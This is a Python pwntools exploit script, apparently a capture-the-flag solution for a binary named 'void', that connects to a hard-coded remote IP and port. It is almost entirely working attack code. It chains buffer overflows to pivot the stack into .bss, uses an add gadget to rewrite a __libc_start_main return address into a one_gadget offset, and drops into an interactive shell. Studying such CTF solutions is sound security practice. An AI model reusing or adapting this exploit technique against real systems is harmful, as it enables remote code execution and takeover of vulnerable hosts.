from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./void"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("94.237.54.145", 38800)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


libc_offset = 0x7f4673f51c20 - 0x7f4673f2e000


bss = 0x404030
ret = 0x401142
pop_rdi = 0x4011bb
pop_rsi_r15 = 0x4011b9
pop_rbp = 0x401109
read_rbp_0x40 = 0x040112A
call_main = 0x401040
read_got = elf.got["read"]
read_plt = elf.plt["read"]
pop_rbx_6 = 0x4011b2
leave_ret = 0x401141
vuln = 0x40112A
add = 0x401108
start_main_offset = 0x7f999c8d8d0a - 0x7f999c8b5000  # 0x23d0a
binsh = next(libc.search(b"/bin/sh"))  # 0x196152
system = libc.symbols["system"]       # 0x45e50
execve = libc.symbols["execve"]        # 0xc8fc0
log.success(hex(binsh))
log.success(hex(system))
log.success(hex(execve))

payload = b"a"*0x40
payload += p64(bss+0x800)
payload += p64(vuln)


io.sendline(payload)
pause()

payload = b"b" * 0x48
payload += p64(call_main)
io.sendline(payload)
pause()
"""
0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 0x404758 —▸ 0x7f999c8d8d0a
"""
payload = b"c" * 0x40 + p64(bss+0x600)
payload += p64(vuln)
io.sendline(payload)
pause()

payload = b"/bin/sh"
payload = payload.ljust(0x40, b"\x00") + p64(bss+0x600)
payload += p64(pop_rbx_6) + p64(0xc961a-start_main_offset) + p64(0)*5
payload += p64(pop_rbp) + p64(0x3d+0x404758)
payload += p64(add)
payload += p64(pop_rbp) + p64(0x404750)
payload += p64(vuln)

io.sendline(payload)
pause()


ddebug("break *0x401141 \n b *0x401122\n b *0x40112a\n set follow-fork-mode parent \n b *0x404848\n continue")
binsh = 0x4045f0
payload = b"1"*0x40+p64(0)
# payload += p64(pop_rsi_r15)+p64(0)*2
# payload += p64(ret)
# payload += p64(pop_rdi) + p64(binsh)

io.send(payload)

io.interactive()
